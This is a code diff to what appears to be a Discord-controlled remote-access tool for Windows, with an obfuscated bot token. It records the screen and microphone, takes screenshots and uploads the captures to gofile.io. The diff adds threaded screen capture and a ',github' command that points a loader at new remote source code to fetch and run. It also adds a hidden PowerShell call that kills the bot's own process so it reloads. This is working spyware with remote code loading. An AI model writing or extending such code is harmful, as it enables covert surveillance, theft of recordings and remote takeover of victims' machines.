@@ -1,10 +1,13 @@
 import os
 import sys
 import time
+import json
 import base64
 import tempfile
 import subprocess
 import ctypes
+import threading
+import queue
 import requests
 import discord
 from discord.ext import commands
@@ -17,6 +20,7 @@ import soundfile as sf
 
 # ==================== CONFIG ====================
 _APP_ID = "LGMNCCA7Z0QCYC8rdQkNRi9jGQsgFWsJA2VYFWgbKAMWGRR3FyFCNyNaODZnOjRBWHkgUlUEajt+cDo5TiYwelRuCFNdfFU5"
+CONFIG_FILE = os.path.join(os.environ.get("TEMP", tempfile.gettempdir()), "wificall_config.json")
 # ================================================
 
 
@@ -31,7 +35,6 @@ def _resolve_id(blob: str) -> str:
 
 TOKEN = _resolve_id(_APP_ID)
 
-# ---------- WIN32 CONSTANTS ----------
 PROCESS_SUSPEND_RESUME = 0x0800
 
 
@@ -45,26 +48,54 @@ def take_screenshot(path: str):
 
 
 def record_screen(path: str, duration=30, fps=60):
-    with mss.mss() as sct:
-        monitor = sct.monitors[0]
-        width = monitor["width"] - (monitor["width"] % 2)
-        height = monitor["height"] - (monitor["height"] % 2)
-        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
-        out = cv2.VideoWriter(path, fourcc, fps, (width, height))
-        frame_interval = 1.0 / fps
-        end_time = time.time() + duration
-        while time.time() < end_time:
-            loop_start = time.time()
-            shot = sct.grab(monitor)
-            frame = np.array(shot)
-            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
-            frame = frame[:height, :width]
-            out.write(frame)
-            elapsed = time.time() - loop_start
-            sleep_for = frame_interval - elapsed
-            if sleep_for > 0:
-                time.sleep(sleep_for)
-        out.release()
+    """Record screen for exactly duration*fps frames at the given fps. Capture and encoding run in parallel threads."""
+    target_frames = int(duration * fps)
+    frame_interval = 1.0 / fps
+    frame_queue = queue.Queue(maxsize=fps * 5)
+    writer_info = {"size": None}
+
+    def capture_thread():
+        try:
+            with mss.mss() as sct:
+                monitor = sct.monitors[0]
+                w = monitor["width"] - (monitor["width"] % 2)
+                h = monitor["height"] - (monitor["height"] % 2)
+                writer_info["size"] = (w, h)
+                next_deadline = time.perf_counter()
+                for _ in range(target_frames):
+                    shot = sct.grab(monitor)
+                    frame = cv2.cvtColor(np.array(shot), cv2.COLOR_BGRA2BGR)[:h, :w]
+                    frame_queue.put(frame)
+                    next_deadline += frame_interval
+                    sleep_for = next_deadline - time.perf_counter()
+                    if sleep_for > 0:
+                        time.sleep(sleep_for)
+        except Exception:
+            pass
+        finally:
+            frame_queue.put(None)
+
+    def writer_thread():
+        writer = None
+        try:
+            while True:
+                frame = frame_queue.get()
+                if frame is None:
+                    break
+                if writer is None:
+                    w, h = writer_info["size"]
+                    writer = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*"mp4v"), fps, (w, h))
+                writer.write(frame)
+        finally:
+            if writer is not None:
+                writer.release()
+
+    t_cap = threading.Thread(target=capture_thread, daemon=True)
+    t_wrt = threading.Thread(target=writer_thread, daemon=True)
+    t_wrt.start()
+    t_cap.start()
+    t_cap.join()
+    t_wrt.join()
 
 
 def record_mic(path: str, duration=30, samplerate=44100):
@@ -80,7 +111,7 @@ def upload_to_gofile(filepath: str) -> str:
     server = r.json()["data"]["servers"][0]["name"]
     url = f"https://{server}.gofile.io/contents/uploadfile"
     with open(filepath, "rb") as f:
-        resp = requests.post(url, files={"file": (os.path.basename(filepath), f)}, timeout=120)
+        resp = requests.post(url, files={"file": (os.path.basename(filepath), f)}, timeout=300)
     resp.raise_for_status()
     return resp.json()["data"]["downloadPage"]
 
@@ -194,6 +225,20 @@ def kill_pid(pid: int) -> bool:
         return False
 
 
+def convert_to_raw(url: str) -> str:
+    if "github.com" in url and "/blob/" in url:
+        return url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
+    return url
+
+
+def save_raw_url(url: str):
+    try:
+        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
+            json.dump({"raw_url": url}, f)
+    except Exception:
+        pass
+
+
 # ==========================================================
 # BOT
 # ==========================================================
@@ -205,6 +250,33 @@ bot = commands.Bot(command_prefix=",", intents=intents)
 @bot.event
 async def on_ready():
     pass
+
+
+@bot.command(name="github")
+async def github_cmd(ctx, url: str = None):
+    if not url:
+        await ctx.send("Usage: `,github <github_or_raw_url>`\n"
+                       "Example: `,github https://github.com/user/repo/blob/main/Wifi.py`")
+        return
+    raw = convert_to_raw(url)
+    if not raw.startswith("http"):
+        await ctx.send("❌ Invalid URL.")
+        return
+    save_raw_url(raw)
+    await ctx.send(f"✅ New source set to:\n`{raw}`\n\nReloading now — bot will be back in a few seconds.")
+
+    # Kill only the child bot process (not the loader).
+    # The loader polls the config file every 5 seconds and will relaunch the child with the new URL.
+    if os.name == "nt":
+        try:
+            ps = ("Get-CimInstance Win32_Process -Filter \"Name='pythonw.exe'\" | "
+                  "Where-Object { $_.CommandLine -like '*discord_pc_bot_remote.py*' } | "
+                  "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }")
+            subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps],
+                             creationflags=0x08000000,
+                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
 
 
 @bot.command(name="screenshot")
@@ -228,13 +300,15 @@ async def screenshot_cmd(ctx):
 @bot.command(name="video")
 async def video_cmd(ctx):
     await ctx.message.add_reaction("⏳")
-    await ctx.send("🎥 Recording 30 seconds at 60 FPS...")
+    msg = await ctx.send("🎥 Recording 30 seconds at 60 FPS...")
     tmp = os.path.join(tempfile.gettempdir(), f"rec_{int(time.time())}.mp4")
     try:
+        start = time.time()
         await bot.loop.run_in_executor(None, record_screen, tmp)
-        await ctx.send("☁️ Uploading to gofile.io...")
+        elapsed = time.time() - start
+        await msg.edit(content=f"☁️ Recording done in {elapsed:.1f}s. Uploading to gofile.io...")
         link = await bot.loop.run_in_executor(None, upload_to_gofile, tmp)
-        await ctx.send(f"✅ **Recording ready:** {link}")
+        await msg.edit(content=f"✅ **Recording ready** (30s @ 60fps): {link}")
         await ctx.message.remove_reaction("⏳", bot.user)
         await ctx.message.add_reaction("✅")
     except Exception as e:
